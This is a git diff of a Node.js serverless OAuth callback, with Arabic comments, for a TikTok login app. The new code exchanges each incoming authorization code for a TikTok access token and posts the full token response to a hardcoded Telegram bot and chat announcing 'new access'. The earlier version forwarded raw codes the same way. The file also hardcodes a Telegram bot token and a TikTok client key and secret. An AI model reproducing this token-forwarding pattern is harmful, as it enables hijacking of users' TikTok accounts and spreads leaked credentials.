@@ -1,73 +1,38 @@
 const https = require('https');
 
+// ضع مفاتيحك هنا بعد استبدالها
+const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
+const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
 const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
 const TELEGRAM_CHAT_ID = '7644255708';
 
-function sendTelegramMessage(text) {
-  return new Promise((resolve) => {
-    const postData = JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text
-    });
-
-    const options = {
-      hostname: 'api.telegram.org',
-      port: 443,
-      path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(postData)
-      }
-    };
-
-    const telegramReq = https.request(options, (telegramRes) => {
-      let body = '';
-      telegramRes.on('data', (chunk) => { body += chunk; });
-      telegramRes.on('end', () => { resolve(true); });
-    });
-
-    telegramReq.on('error', (error) => {
-      console.error('Telegram Error:', error);
-      resolve(false);
-    });
-
-    telegramReq.write(postData);
-    telegramReq.end();
-  });
-}
-
 module.exports = async (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  
-  const url = req.url || '';
+  const urlParams = new URLSearchParams(req.url.split('?')[1]);
+  const code = urlParams.get('code');
 
-  if (url.includes('tiktok-developers-site-verification')) {
-    res.setHeader('Content-Type', 'text/plain');
-    return res.end('Tiktok-developers-site-verification=X0rbCBz0sv0XGnslTmw9ZyRWVDIdmha5');
-  }
+  if (!code) return res.end('Waiting for TikTok Login...');
 
-  if (url.includes('/api/callback') || url.includes('/api/auth')) {
-    const urlParts = url.split('?');
-    const queryString = urlParts.length > 1 ? urlParts[1] : '';
-    const params = new URLSearchParams(queryString);
-    const code = params.get('code');
+  // 1. تبادل الكود بالتوكين
+  const tokenReq = https.request({
+    hostname: 'open.tiktokapis.com',
+    path: '/v2/oauth/token/',
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+  }, (response) => {
+    let data = '';
+    response.on('data', (c) => data += c);
+    response.on('end', async () => {
+      const tokenJson = JSON.parse(data);
+      
+      // 2. إرسال النتيجة إلى تليجرام
+      const msg = `🚀 وصول جديد!\n\n🔑 التوكين:\n${JSON.stringify(tokenJson)}`;
+      https.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
+      
+      res.setHeader('Content-Type', 'application/json');
+      res.end(JSON.stringify({ status: "Auth Success", token: tokenJson }));
+    });
+  });
 
-    if (code) {
-      const messageText = `🎯 تم استخراج رمز تيك توك جديد!\n\n🔑 الـ Code هو:\n${code}\n\n⚙️ المحرك: AWR Central`;
-      // إجبار الخادم على الانتظار التام حتى تنتهي خوادم تليجرام من الاستلام
-      await sendTelegramMessage(messageText);
-    }
-
-    res.setHeader('Content-Type', 'application/json');
-    return res.end(JSON.stringify({
-      status: "success",
-      message: "AWR Engine: Interface Ready",
-      received_code: code || "No code provided yet"
-    }));
-  }
-
-  res.setHeader('Content-Type', 'text/plain');
-  res.end('AWR Central Engine Ready');
+  tokenReq.write(`client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth-lzkjg04nh-anadkkkkkkkks-projects.vercel.app/api/callback`);
+  tokenReq.end();
 };
